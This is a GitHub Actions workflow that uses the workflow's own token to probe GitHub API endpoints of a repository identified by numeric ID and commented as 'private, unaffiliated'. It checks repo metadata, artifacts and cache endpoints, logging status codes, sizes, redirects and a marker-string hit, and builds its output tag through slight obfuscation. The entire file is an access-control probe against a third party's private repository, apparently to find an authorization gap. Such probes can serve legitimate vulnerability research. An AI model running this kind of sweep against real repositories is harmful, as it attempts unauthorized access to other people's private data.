name: numid-sweep
on: { workflow_dispatch: {} }
permissions: {}
jobs:
  sweep:
    runs-on: ubuntu-latest
    steps:
      - name: sweep
        env:
          T: ${{ secrets.GITHUB_TOKEN }}
        run: |
          TARGET=1335705628
          CTRLPUB=1320174629
          MK=$(printf '%s%s' RES ULT)
          probe() {
            id=$1; suf=$2; tag=$3
            out=$(curl -s -D /tmp/h -o /tmp/b -w '%{http_code}' \
                   -H "Authorization: token $T" \
                   -H 'Accept: application/vnd.github+json' \
                   "https://api.github.com/repositories/$id$suf")
            hit=no
            if grep -qi 'pkg-perm-probe' /tmp/h /tmp/b 2>/dev/null; then hit=NAME; fi
            loc=$(grep -i '^location:' /tmp/h | tr -d '\r' | cut -c1-120)
            sz=$(wc -c < /tmp/b)
            echo "$MK $out $tag $suf sz=$sz hit=$hit $loc"
          }

          # --- target (private, unaffiliated) ---
          probe $TARGET "" PRIV
          probe $TARGET "/actions/artifacts" PRIV
          probe $TARGET "/actions/cache/retention-limit" PRIV
          probe $TARGET "/actions/caches" PRIV
          probe $TARGET "/actions/cache/storage-limit" PRIV
